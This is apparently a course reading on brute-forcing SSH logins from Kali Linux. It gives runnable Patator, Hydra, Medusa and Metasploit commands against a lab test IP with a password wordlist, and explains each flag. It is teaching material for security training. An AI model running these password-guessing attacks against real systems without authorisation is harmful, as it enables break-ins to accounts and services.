## Class 15

------

### Reading: Brute-force attacks with Kali Linux

Brute-force search (exhaustive search) is a mathematical method, which difficulty depends on a number of all possible solutions

The definition "brute-force" is usually used in the context of hackers attacks when the intruder tries to find valid login/password to an account or service.

Tools possible to use brute-force attacks on SSH and web services available in:

+ Kali Linux
  + Patator
  + Medusa
  + THC Hydra
  + Metasploit
+ BurpSuite

#### Brute-force SSH

Example for test machine with IPaddress 192.168.60.50 and try to find a user test password using SSH. Popular passwords used from the standart dictionary rockyou.txt

##### Patator

`patator ssh_login host=192.168.60.50 user=test password=FILE0 0=/root/wordlist -x ignore:mesg=’Authentication failed’`

- **ssh_login** — is a necessary module;
- **host** — is our target;
- **user** — is user’s login, for which the password is found, or file contains many logins for multiple search;
- **password** — is a dictionary contains passwords;
- **-x ignore:mesg=’Authentication failed’** — is a command not to display a line containing that message.

##### THC Hydra

`hydra -V -f -t 4 -l test -P /root/wordlist ssh://192.168.60.50`

- **-V** — to display a couple login+password while the password mining;
- **-f** — is a stop as soon as the password for specified login will be found;
- **-P** — is a path to the password dictionary;
- **ssh://192.168.60.50** — is a service and victim IP address.

##### Medusa

`medusa -h 192.168.60.50 -u test -P /root/wordlist -M ssh -f -v 6`

- **-h** — is victim IP address;
- **-u** — is a login;
- **-P** — is a dictionary path;
- **-M** — is a module choice;
- **-f** — is stop as soon as the valid login/password couple is found;
- **-v** — is a setting of the message display on the monitor during the password mining.

##### Metasploit

Find the instrument for brute-force attack using SSH:

`search ssh_login`

Use module:

`use auxiliary/scanner/ssh/ssh_login`

Use command **show options** to review necessary parameters. For us these are:

- **rhosts** — is victim IP address;
- **rport** — is a port;
- **username** — is SSH login;
- **useerpass_file** — is a dictionary path;
- **stop_on_success** — is a stop as soon as login/password couple will be found;
- **threads** — is a number of flows.

The indication of necessary parameters is using «set» command.

```
set rhosts 192.168.60.50
set username test
set userpass_file /root/wordlist
set stop_on_success yes
set threads 4
set rport 22
```

When the necessary parameters are indicated bring in the command «run» and wait.